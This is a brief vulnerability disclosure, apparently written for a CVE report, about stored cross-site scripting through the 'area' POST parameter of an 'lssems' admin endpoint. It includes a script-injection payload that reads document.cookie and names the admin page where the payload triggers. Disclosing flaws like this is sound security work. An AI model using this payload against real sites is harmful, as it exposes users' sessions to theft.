BUG_Author: sikii

Vulnerability File: /lssems/admin/ajax.php?action=save_area

POST parameter "area" exists stored cross-site scripting vulnerability

Payload: id=&area=<script>alert(document.cookie)</script>

![image](https://github.com/sikii7/CVE/blob/main/pic/xss1.png)

Payload will trigger when a user visits on http://localhost/lssems/admin/index.php?page=areas

![image](https://github.com/sikii7/CVE/blob/main/pic/xss2.png)
